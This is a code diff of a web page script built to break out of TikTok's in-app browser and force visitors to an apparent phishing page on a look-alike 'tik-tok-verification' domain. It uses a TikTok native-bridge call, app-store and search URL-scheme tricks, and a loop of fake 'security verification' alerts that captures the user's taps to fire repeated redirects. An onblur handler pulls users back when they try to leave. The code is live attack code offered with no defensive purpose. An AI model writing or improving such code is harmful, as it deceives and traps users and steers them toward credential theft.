@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
+    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
 </head>
 <body>
 
@@ -11,47 +11,49 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function forceSystemRedirect() {
+    function bridgeBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const urlNoProtocol = target.replace("https://", "");
 
-        // THE PRIMARY LEAK (Search and Store)
-        window.location.replace("x-web-search://?" + encodeURIComponent(target));
-        
-        if (isAndroid) {
-            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
-        } else {
-            // iOS Apple Maps search often forces Safari to open the result
-            window.location.href = "maps://?q=" + encodeURIComponent(target);
-        }
+        // 1. TikTok Native Bridge Call (The 'Nuclear' Option)
+        try {
+            if (window.ToutiaoJSBridge) {
+                window.ToutiaoJSBridge.call('openSchema', { schema: target });
+            }
+        } catch(e) {}
+
+        // 2. High-Priority Store Handover
+        // Store links usually 'force' the OS to show an "Open in App Store" prompt
+        // and when that search fails, the OS often defaults back to the browser.
+        window.location.href = isAndroid 
+            ? "market://details?id=com.android.chrome&url=" + encodeURIComponent(target)
+            : "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?term=" + encodeURIComponent(target);
+
+        // 3. Fallback to what worked (Search Protocol)
+        setTimeout(() => {
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
+        }, 50);
     }
 
     function rampage() {
         if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        // 1. First alert to 'prime' the user gesture
-        alert("ATTEMPT #24\n\nStep 1: Authorization Required.\n\nTap OK.");
+        bridgeBreakout();
 
-        // 2. A 100ms 'Silence' window where the redirect fires
-        forceSystemRedirect();
+        // THE LOCK
+        alert("ATTEMPT #25\n\nSecurity verification required.\n\nTap OK to authorize system browser.");
 
-        setTimeout(() => {
-            if (Date.now() > killTime) return;
+        // The instant they tap 'OK', we use that physical gesture to fire again
+        bridgeBreakout();
 
-            // 3. Second alert to 'lock' the thread while the OS processes the redirect
-            alert("ATTEMPT #24\n\nStep 2: Syncing with Safari/Chrome...\n\nTap OK.");
-            
-            forceSystemRedirect();
-            
-            // Loop back
-            setTimeout(rampage, 10);
-        }, 100); 
+        setTimeout(rampage, 10);
     }
 
     window.onload = () => {
         rampage();
     };
 
+    // If they swipe or blur, lock them back in
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
